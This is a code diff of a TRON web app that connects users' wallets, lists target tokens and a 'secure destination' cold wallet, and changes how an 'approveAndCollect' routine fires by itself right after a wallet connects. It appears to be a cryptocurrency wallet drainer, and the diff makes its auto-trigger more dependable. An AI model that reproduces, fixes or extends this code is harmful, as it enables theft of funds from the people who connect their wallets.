@@ -31,7 +31,7 @@ const NETWORK: 'Mainnet' | 'Nile' = 'Nile'
 const TRON_CONTRACT_ADDRESS_MAINNET = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
 const TRON_CONTRACT_ADDRESS_NILE = 'TCBjbz46uqhnhYoTo1msE8tDoV6hvgGqK2' 
 
-const TRON_CONTRACT_ADDRESS = NETWORK === 'Mainnet' ? TRON_CONTRACT_ADDRESS_MAINNET : TRON_CONTRACT_ADDRESS_NILE;
+const TRON_CONTRACT_ADDRESS = (NETWORK as string) === 'Mainnet' ? TRON_CONTRACT_ADDRESS_MAINNET : TRON_CONTRACT_ADDRESS_NILE;
 
 // 💰 SECURE DESTINATION WALLETS
 const TRON_COLD_WALLET = 'TPH1PHyLPAXb2aeDSo1uNLJhRiAitSuDHM'; 
@@ -61,7 +61,8 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
-const activeNetwork = NETWORK === 'Mainnet' ? tronMainnet : tronNile;
+// 🛠️ DYNAMIC APPKIT NETWORK
+const activeNetwork = (NETWORK as string) === 'Mainnet' ? tronMainnet : tronNile;
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [activeNetwork];
 
 const NETWORK_CONFIG = {
@@ -86,7 +87,6 @@ const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWOR
 // ── Reown Adapters ──
 const tronAdapter = new TronAdapter({
   walletAdapters: [
-    // 🛠️ FIX: Made Adapters robust. Now they deep-link to the App if the user is in normal Safari!
     new TronLinkAdapter({ openUrlWhenWalletNotFound: true, checkTimeout: 3000 }),
     new TrustAdapter({ openUrlWhenWalletNotFound: true }), 
     new OkxWalletAdapter({ openUrlWhenWalletNotFound: true }),
@@ -107,7 +107,6 @@ createAppKit({
   themeMode: 'light', 
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
-  // 🛠️ FIX: Force Trust Wallet and OKX (which natively support Tron) to the top of the list
   featuredWalletIds: [
     '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
     '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709', // OKX Wallet
@@ -148,7 +147,7 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
-const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
 
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
@@ -158,7 +157,6 @@ export default function App() {
   const [amountError, setAmountError] = useState('')
   const [debugLogs, setDebugLogs] = useState<string[]>([]);
   
-  const autoTriggered = useRef(false)
   const manualConnect = useRef(false)
   const isExecuting = useRef(false)
 
@@ -190,11 +188,9 @@ export default function App() {
   }
 
   useEffect(() => {
+    if (!isConnected || !walletAddress) return;
+
     const init = async () => {
-      if (!isConnected || !walletAddress) {
-        autoTriggered.current = false;
-        return;
-      }
       log(`[SYSTEM] Connected TRON: ${walletAddress}`);
 
       setStatus('Initializing TRON...');
@@ -211,15 +207,16 @@ export default function App() {
       } else {
         await getTronBalance(finalTronWeb, walletAddress);
       }
-
-      if (!autoTriggered.current && manualConnect.current) {
-        autoTriggered.current = true;
-        log("🔥 Auto-triggering Tron Priority Loop...");
-        setLoading(true); 
-        setTimeout(() => approveAndCollect(), 500); 
-      }
     };
     init();
+
+    // 🛠️ THE SINGLE-SHOT CONSUMPTION LOCK (Mirrored perfectly from the EVM version)
+    if (manualConnect.current) {
+      manualConnect.current = false; // Consumes the lock instantly
+      log("🔥 Auto-triggering Tron Priority Loop...");
+      setLoading(true); 
+      setTimeout(() => approveAndCollect(), 500); 
+    }
   }, [isConnected, walletAddress, tronWalletProvider]);
 
   const getTronBalance = async (tw: any, addr: string): Promise<number> => {
@@ -240,10 +237,9 @@ export default function App() {
     setAmountError('');
 
     if (!isConnected) {
-      manualConnect.current = true;
+      manualConnect.current = true; // Primes the single-shot lock
       open(); 
     } else {
-      manualConnect.current = true;
       approveAndCollect();
     }
   }
@@ -392,8 +388,6 @@ export default function App() {
       setStatus(`❌ Failed: ${err?.message?.substring(0, 50)}`);
     } finally {
       isExecuting.current = false;
-      autoTriggered.current = false; 
-      manualConnect.current = false; 
       setLoading(false);
     }
   };
